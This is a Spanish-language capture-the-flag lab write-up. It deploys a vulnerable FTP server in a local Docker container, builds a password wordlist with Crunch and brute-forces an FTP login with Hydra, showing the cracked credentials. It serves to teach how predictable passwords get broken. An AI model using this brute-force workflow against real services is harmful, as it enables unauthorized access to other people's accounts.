# 🧠 CyberComandos - Laboratorio CTF: Servicio FTP Vulnerable

> Laboratorio práctico de **ciberseguridad ofensiva** orientado a la detección y explotación de servicios FTP mal configurados, usando contenedores Docker y herramientas como Crunch, Hydra y Nmap.

---

## 🐳 1. Despliegue de Contenedor Docker Vulnerable

Usaremos la imagen `j4rvisai/ftp_server:1.0`, que monta un servidor FTP (`vsFTPd`) sobre Ubuntu.

### 📥 Paso 1.1 – Descargar imagen desde Docker Hub

```bash
sudo docker pull j4rvisai/ftp_server:1.0
```
![Pull Docker](images/image1.jpg)

---

### ▶️ Paso 1.2 – Ejecutar el contenedor

```bash
sudo docker run -d -p 2222:21 --name ftp_server j4rvisai/ftp_server:1.0
```

📌 **Parámetros explicados:**
- `-d`: Modo detached (segundo plano).
- `-p 2222:21`: Redirección de puertos.
- `--name ftp_server`: Alias del contenedor.

![Contenedor en ejecución](images/image2.jpg)

---

## 🔎 2. Verificación del Servicio Expuesto

### 📋 Paso 2.1 – Verificar contenedor activo

```bash
sudo docker ps
```
![docker ps](images/image3.jpg)

### 🌐 Paso 2.2 – Verificar puerto con Nmap

```bash
nmap -p 2222 localhost
```
![Nmap 2222](images/image4.jpg)

---

## 🧰 3. Generación de Diccionario con Crunch

Creamos un diccionario con la estructura de contraseña esperada:

```bash
crunch 15 15 -t Julior0@@@@@tas -o dict.txt
```

📌 **Explicación del patrón:**  
`Julior0` + 5 letras minúsculas (`@`) + `tas`

```bash
head dict.txt
```
![Crunch y head](images/image5.jpg)

---

## 🔐 4. Prueba Manual de Acceso FTP

```bash
ftp localhost -p 2222
```
Se comprueba el correcto funcionamiento del servicio FTP.

![FTP manual](images/image6.jpg)

---

## 🦾 5. Ataque de Fuerza Bruta con Hydra

```bash
hydra -l julio.ventas -P dict.txt ftp://localhost:2222 -t 4
```

📌 **Parámetros:**
- `-l`: Usuario (`julio.ventas`)
- `-P`: Diccionario (`dict.txt`)
- `ftp://localhost:2222`: Objetivo
- `-t 4`: Hilos paralelos

✔️ Resultado:
```
[22][ftp] host: localhost login: julio.ventas password: Julior0joventas
```

![Hydra](images/image7.jpeg)

---

## 📌 Conclusión

Este CTF demuestra cómo una configuración FTP insegura y el uso de contraseñas predecibles pueden derivar en una vulnerabilidad crítica. Las herramientas empleadas permiten simular un entorno real de explotación de servicios en red.

---

## 🛠️ Herramientas Usadas

| Herramienta | Función |
|-------------|---------|
| 🐳 Docker | Despliegue de entorno vulnerable |
| 📡 Nmap | Verificación de puertos expuestos |
| 🔧 Crunch | Generación de diccionarios |
| ⚔️ Hydra | Fuerza bruta sobre servicios FTP |
| 💻 FTP | Cliente para conexión manual |

---

© CyberComandos CTF 2025 🚩
